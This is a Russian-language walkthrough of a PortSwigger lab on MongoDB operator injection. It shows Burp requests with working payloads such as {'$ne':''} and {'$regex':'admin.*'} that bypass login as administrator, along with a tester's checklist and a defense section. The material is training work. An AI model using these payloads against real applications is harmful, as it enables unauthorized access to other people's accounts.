# 📘 PortSwigger Lab: Exploiting NoSQL operator injection to bypass authentication

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/all-labs/nosql-injection/lab-nosql-injection-bypass-authentication  
> 🎯 Тема: NoSQL Injection — operator injection в MongoDB (обход аутентификации)  
> 🧪 Уровень: Apprentice  
> ✅ Статус: Solved  
> 🛠 Инструменты: Burp Suite (Repeater)

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🗺 Операторы MongoDB](#operators)
- [🔍 Шаг 1 — Разведка: логин как wiener](#step1)
- [🔍 Шаг 2 — Проверка operator injection в username](#step2)
- [🔍 Шаг 3 — Подтверждение через $regex](#step3)
- [🔍 Шаг 4 — Двойная инъекция: unexpected records](#step4)
- [🔍 Шаг 5 — Эксплуатация: логин как admin](#step5)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Функция логина работает на MongoDB и уязвима к operator injection. Задача:

```text
Войти в приложение как пользователь administrator.
```

Учётные данные собственного аккаунта:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Краткая теория

В отличие от syntax injection (ломаем синтаксис), **operator injection** внедряет операторы запросов MongoDB прямо в JSON-структуру запроса. Если приложение принимает JSON в параметрах логина и передаёт его в `find()` без фильтрации:

```javascript
// серверный код (уязвимый)
db.users.find({ username: <ввод>, password: <ввод> })
```

то вместо строки можно передать объект-оператор — и сравнение превратится в произвольное условие.

### Операторы MongoDB

```text
$ne      — not equal (не равно)
$regex   — совпадение с регулярным выражением
$gt      — больше чем
$eq      — равно (явное)
$in      — значение из списка
$where   — произвольный JavaScript (самый опасный)
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Обычный запрос при логине:

```javascript
{ username: "wiener", password: "peter" }   → найти ровно этого пользователя
```

Инъекция:

```javascript
{ username: {"$ne":""}, password: {"$ne":""} }
              ↑ «не равно пустой строке»
```

Условие превращается в «username ≠ "" И password ≠ ""» — под это подходят **все** пользователи. База возвращает первую запись, сервер логинит в неё. Если первой в коллекции лежит administrator — мы вошли админом без пароля.

---

<a id="operators"></a>

## 🗺 Операторы MongoDB

Мини-справка по логике:

```text
username: {"$ne":""}     → выбрать любого, чей username не пустой
username: {"$regex":"wien.*"} → выбрать всех, чей username начинается с "wien"
username: {"$regex":"admin.*"} → выбрать всех, чей username начинается с "admin"
```

$regex позволяет **зондировать** структуру коллекции: перебирая шаблоны, можно выяснить, какие пользователи существуют, не видя их данных напрямую.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка: логин как wiener

1. В браузере Burp залогиниться `wiener:peter`.
2. Proxy → HTTP history → найти:

```http
POST /login
Content-Type: application/json
```

3. Правый клик → Send to Repeater.

Обычное JSON-тело:

```json
{"username":"wiener","password":"peter"}
```

Серверный запрос (предполагаемый):

```javascript
db.users.find({ username: "wiener", password: "peter" })
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Проверка operator injection в username

Заменить значение username на оператор:

```json
{"username":{"$ne":""},"password":"peter"}
```

Отправить. **Ожидаем:** успешный логин (не как wiener — сервер берёт первую запись, подходящую под условие).

```text
$ne принят и исполнен = ввод передаётся в запрос без фильтрации
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Подтверждение через $regex

Заменить username на:

```json
{"username":{"$regex":"wien.*"},"password":"peter"}
```

**Ожидаем:** успешный логин как wiener (регулярка совпадает с именем пользователя).

```text
$ne работает  +  $regex работает  = operator injection подтверждена
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Двойная инъекция: unexpected records

Инъекция в оба поля:

```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

**Ожидаем:** ошибка вида «unexpected number of records» / «too many users».

Разбор сигнала:

```text
Один подходящий пользователь  → логин успешен
Несколько подходящих          → сервер не знает, кого логинить → ошибка
```

Это карта местности: под «всё-не-пустое» попадает много пользователей — значит, нужно сузить выборку до одного.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Эксплуатация: логин как admin

Сузить выборку регуляркой по известному имени:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

**Ожидаем:** успешный логин как **administrator** — в коллекции только один пользователь, чьё имя начинается с «admin».

Финал:

1. Правый клик по ответу → **Show response in browser**.
2. Скопировать URL, вставить в браузер Burp.
3. Открыть страницу — сессия администратора → лаба Solved.

---

<a id="requests"></a>

## 📨 Примеры запросов

### Шаг 2 — $ne в username

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$ne":""},"password":"peter"}
```

### Шаг 3 — $regex подтверждение

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$regex":"wien.*"},"password":"peter"}
```

### Шаг 4 — оба поля, unexpected records

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$ne":""},"password":{"$ne":""}}
```

### Шаг 5 — финальный эксплойт

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

---

<a id="response"></a>

## 📥 Пример результата

### Шаги 2–3 — успешный логин

```text
HTTP/2 302 Found
Location: /my-account
```

### Шаг 4 — ошибка множественности

```text
Cannot login - unexpected number of records: 3
```

### Шаг 5 — логин админом

```text
HTTP/2 302 Found
Location: /my-account
→ страница аккаунта администратора

Статус лабы: Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Логин wiener:peter → POST /login в Repeater
2. username={"$ne":""} + password=peter → логин проходит (операторы приняты)
3. username={"$regex":"wien.*"} → логин как wiener (инъекция подтверждена)
4. Оба поля {"$ne":""} → ошибка «unexpected number of records»
   (в коллекции много пользователей)
5. username={"$regex":"admin.*"} + password={"$ne":""} → логин админом
6. Show response in browser → лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. JSON принимается как есть

Приложение парсит тело запроса и передаёт значения в `find()` без проверки типов. Сервер ждёт строку, а получает объект `{"$ne":""}` — и Mongo исполняет его как условие.

### 2. Сравнение «строка vs оператор» невозможно — возможна подмена условия

Валидация «пароль совпадает» превращается из проверки конкретного пароля в условие «пароль не пустой». Криптографическая проверка заменяется тривиально истинным сравнением.

### 3. Сервер логинит первую запись результата

Бизнес-логика рассчитана на «запрос вернул ровно одного пользователя». Когда возвращается несколько — ошибка, когда один подходящий — логин. Регулярка `admin.*` сужает выборку до нужного.

### 4. Ошибка раскрыла структуру коллекции

Сообщение «unexpected number of records» — разведка: под широкий критерий попадает больше одного пользователя. Это подсказало, что нужно сужение через $regex.

### 5. Сессия выдаётся по факту совпадения, а не по знанию пароля

Аутентификация «выдать сессию, если запрос нашёл пользователя» фундаментально уязвима, когда условие запроса контролируется атакующим.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При тесте логина на operator injection:

```text
1. Проверить формат: JSON-тело? URL-параметры? (operator injection
   работает в JSON; в URL-параметрах возможна через syntax injection)
2. Проба в одно поле: {"$ne":""} → изменился ли результат?
3. Проба $regex с известным именем: {"$regex":"wiener.*"}
4. Оба поля {"$ne":""} → ошибка множественности = карта коллекции
5. Сужение: {"$regex":"admin.*"} / {"$regex":"a.*"} / {"$ne":"wiener"}
```

Если сервер принимает данные не как JSON, а как обычные параметры, те же операторы можно передавать в форме `username[$ne]=` (PHP-стиль) — стоит проверить оба варианта.

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Вставить оператор как строку

`{"username":"{\"$ne\":\"\"}","password":"peter"}` — оператор внутри кавычек это просто текст. Оператор должен быть **объектом**: `"username":{"$ne":""}`.

### Ошибка 2. Инъекция только в password без сужения username

`{"username":"wiener","password":{"$ne":""}}` логинит wiener — внешне «сработало», но ничего не дало. Смысл атаки — уйти от известного имени, а не заменить пароль для него.

### Ошибка 3. Пропустить сигнал unexpected records

Ошибка шага 4 — не тупик, а разведка: она говорит, что под условие попадает много пользователей. Дальше — сужение через $regex.

### Ошибка 4. Не URL-кодировать при отправке как form-data

Если сервер принимает form-data, а не JSON, оператор отправляется как `username[$ne]=` — отправка JSON-синтаксиса в form-поле не сработает.

### Ошибка 5. Считать, что $ne всегда возвращает первую запись админом

Порядок записей не гарантирован. Если первой оказалась другая запись, логин произойдёт в неё. Правильный ответ — сужать критерий ($regex), а не надеяться на порядок.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Валидация типов входных данных

Проверять, что username и password — строки, и отклонять объекты:

```javascript
if (typeof req.body.username !== "string") reject();
```

### 2. Не собирать запрос из пользовательских объектов

Формировать фильтр явно, а не пробрасывать тело запроса в `find()`:

```javascript
// плохо
db.users.find({ username: req.body.username, password: req.body.password })

// хорошо
db.users.find({ username: String(req.body.username) })
```

### 3. Сравнение пароля вне запроса

Сначала найти пользователя по имени, затем проверить хеш пароля в коде (bcrypt.compare) — условие пароля не попадает в запрос вообще.

### 4. Отказ от избыточных операторов

Запретить `$where` и пользовательские JS-выражения; ограничить допустимые операторы whitelist'ом, если они нужны API.

### 5. Единственная запись в результате

Логинить только при ровно одном совпадении, при большем — отказ (не первая попавшаяся запись).

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Логин wiener:peter выполнен
- [ ] POST /login (JSON) отправлен в Repeater

### Детект

- [ ] `username: {"$ne":""}` → логин проходит
- [ ] `username: {"$regex":"wien.*"}` → логин как wiener
- [ ] Оба поля `{"$ne":""}` → ошибка unexpected records

### Эксплуатация

- [ ] `username: {"$regex":"admin.*"}` + `password: {"$ne":""}` → логин админом
- [ ] Show response in browser → сессия администратора
- [ ] Статус лабы: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **operator injection в MongoDB**:

```text
1. Операторы ($ne, $regex) принимаются в JSON-полях без фильтрации
2. Подмена условия: проверка пароля → «пароль не пустой»
3. Ошибка unexpected records показала: под широкий критерий много пользователей
4. $regex="admin.*" сузил выборку до одного → логин как administrator
```

Главные выводы:

```text
Operator injection — не ломка синтаксиса, а подмена типов: строка → объект-условие.
```

```text
Ошибки приложения — разведка: «unexpected number of records» раскрыл структуру коллекции.
```

```text
Логика «запрос нашёл пользователя → выдать сессию» уязвима, когда условие контролируется атакующим.
```

```text
Защита: валидация типов, явные фильтры, проверка пароля вне запроса, отказ при множественных совпадениях.
```

---

[⬆ Вернуться к началу](#top)
